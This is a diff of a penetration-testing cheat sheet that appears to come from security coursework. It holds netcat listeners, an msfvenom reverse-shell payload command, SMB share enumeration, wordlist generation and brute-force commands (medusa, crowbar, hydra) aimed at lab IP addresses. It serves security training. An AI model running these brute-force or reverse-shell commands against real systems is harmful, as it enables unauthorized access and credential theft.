@@ -1,6 +1,6 @@
 
 # COMMANDS
-## netcat
+### netcat
 #### file transfer
 target machine
 `nc -nlvp 9001 > incoming.exe`
@@ -20,7 +20,7 @@ target
 local
 `nc -lnvp 9001`
 
-## socat
+### socat
 #### connecting
 `socat - TCP4:10.11.0.22:110`
 
@@ -49,12 +49,12 @@ create self-signed certificate
 #### rdesktop
 `rdesktop -u student -k pt -g 2048x1110 192.168.197.10`
 
-## FTP
+### FTP
 `passive`
 toggles the passive/active mode during session
 
 
-## MSFVenom
+### MSFVenom
 
 #### shell generation - bytes
 ```
@@ -63,7 +63,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c â
 
 
 ## windows
-## one-liners
+### one-liners
 #### dir and file
 list all files current dir
 `get-childitem -hidden` 
@@ -169,6 +169,46 @@ QUIT
 
 #### anonymous/fake login - list shares
 cme smb 10.10.11.152 -u 'anon' -p '' --shares 
+
+
+
+# Cracking
+## Wordlists
+#### cewl
+create wordlist from megacorpone.com with a minimum length of 6, output to file "megacorp-cewl.txt"
+`cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`
+
+#### john
+create wordlist from text file with "rules" applied
+`john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt grep Nanobot mutated.txt`
+
+#### crunch
+create a password with minimum and maximum length of 8, -t to specify specific pattern. This will be a large list. (see man page)
+`crunch 8 8 -t ,@@^^%%%`
+create list based off specific characters and write to a file
+`crunch 4 6 0123456789ABCDEF -o crunch.txt`
+create list using mixedalpha, present in charset.lst
+`crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt`
+
+## Attacks
+#### medusa
+use rockyou.txt to attack /admin endpoint as admin user , use HTTP authentication scheme (-M)
+`medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`
+
+#### crowbar
+remote desktop attack (-b) targeting server (-s) with username (-u), wordlist (-C) and number of threads (n)
+`crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1`
+
+#### thc-hydra
+hydra ssh attack using kali username and rockyou.txt
+`hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
+hydra HTTP POST attack specifying username "admin" with "INVALID LOGIN" being a failure criteria
+`hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`
+
+
+
+
+
 
 
 # RESOURCES
